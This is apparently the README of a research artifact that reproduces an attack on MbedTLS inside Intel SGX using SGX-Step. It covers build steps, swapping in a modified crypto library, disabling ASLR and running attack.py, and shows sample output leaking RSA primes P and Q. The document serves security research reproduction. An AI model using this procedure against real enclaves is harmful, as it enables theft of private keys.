# Attack-MbedTLS

### Introduction

This directory contains the code of end-to-end attack against MbedTLS running inside Intel SGX.  More description of the attack can be found in Section 6 of our paper.

### Environment Setup

This attack uses the [SGX-Step](https://github.com/jovanbulck/sgx-step) framework to trigger page faults and hijack the control flow of the victim. Please install SGX-Step following instructions in their repository:

- https://github.com/jovanbulck/sgx-step.

By default, the SGX SDK will be installed to `/opt/intel/sgxsdk`.

After building the SGX-Step, insert the kernel module:

```
cd <path-to-sgx-step>/kernel
sudo insmod sgx-step.ko
```

An example environment setup is as follows:

| Item     | Version                                     |
| -------- | ------------------------------------------- |
| CPU      | Intel(R) Core(TM) i7-6700K CPU              |
| Kernel   | Ubuntu 18.04.6 LTS, Linux 5.4.0-150-generic |
| gcc, g++ | 7.5.0                                       |
| python   | 3.12.8                                      |

### Build

First, update the SGX-Step and SGX SDK paths in `Makefile` if necessary. SGX SDK path locates in line 34 of `Makefile`, and SGX-Step path locates in line 77 of `Makefile`.

```makefile
...
SGX_SDK ?= <path-to-installed-sgx-sdk>   # Path of SGX SDK
...
LIBSGXSTEP_DIR = <path-to-sgx-step>		 # Path of SGX-Step
...
```

Second, to avoid the complicated control flow hijacking setup, update the `libsgx_mbedcrypto.a` in SGX SDK. The default path is `/opt/intel/sgxsdk/lib64`:

```shell
sudo cp lib/libsgx_mbedcrypto.a <path-to-sgx-sdk>/lib64
```

Third, build the attack framework:

```shell
make
```

After building, files `app`, `enclave.so` and `enclave.signed.so` should appear in the directory:

```shell
$ ls
app  App  attack.py  Enclave  enclave.signed.so  enclave.so  lib  Makefile  readme.md  scripts
```

### Run

First, disable ASLR because the attacker has the root privilege (in the threat module):

```shell
sudo ./scripts/disable_aslr.sh
```

Second, run the attack:

```shell
python3 attack.py
```
(Note: python version >=3.7)

If the attack procedure gets stuck due to a communication issue, kill the process and try again.

### Expected Results

The attack procedure will try at most 10 times to leak P and Q of the RSA private keys. When a P and Q larger than 0 is leaked, the procedure will print the values and exit: 

```shell
$ python3 attack.py
Leak P: 0
Leak Q: 0, retry ...
Leak P: F017ABC4B9856E98D33F4ABBD59867D5ED621C5E5C68EB923CE6694045DD723395E6B3436974FA4EC52F9442E52AD8B1143E8EEA7CABD8F3C8CCBE47F53B62A5AA4DBD5BAA0BE627D1C278D934451A5BE6BDB3DC0F30B038C95669111177242000F01B2FC369F610EACDC8CCA73ADB6C9F4652BBC0C04858359B23AFF3C59FD9
Leak Q: CEB49AC859198D9581CDB81A918DA699A99DC7575042B889DC5BAFD9904886B6737CCDDB442E601E44AEDA6775EA01ACAE295FFDA34C5D7BC23EBEC0AA872C7381B57767CF8C2E738973DA01D45679EFF881508B90F8C1D0F73D3653F5F5A3B6395C17F997A6B18C23D9DE2322133234E89CAF8C0A9BDDC46EFECA4B67FB72BD
```

The output of MbedTLS (the ground truth) is recorded in file `rsa_output.txt`. We can print the real P and Q from this private key file to verify that the attack is successful.

```shell
$ cat rsa_output.txt | grep "P = "
    P = F017ABC4B9856E98D33F4ABBD59867D5ED621C5E5C68EB923CE6694045DD723395E6B3436974FA4EC52F9442E52AD8B1143E8EEA7CABD8F3C8CCBE47F53B62A5AA4DBD5BAA0BE627D1C278D934451A5BE6BDB3DC0F30B038C95669111177242000F01B2FC369F610EACDC8CCA73ADB6C9F4652BBC0C04858359B23AFF3C59FD9
```

```shell
$ cat rsa_output.txt | grep "Q = "
    Q = CEB49AC859198D9581CDB81A918DA699A99DC7575042B889DC5BAFD9904886B6737CCDDB442E601E44AEDA6775EA01ACAE295FFDA34C5D7BC23EBEC0AA872C7381B57767CF8C2E738973DA01D45679EFF881508B90F8C1D0F73D3653F5F5A3B6395C17F997A6B18C23D9DE2322133234E89CAF8C0A9BDDC46EFECA4B67FB72BD
```
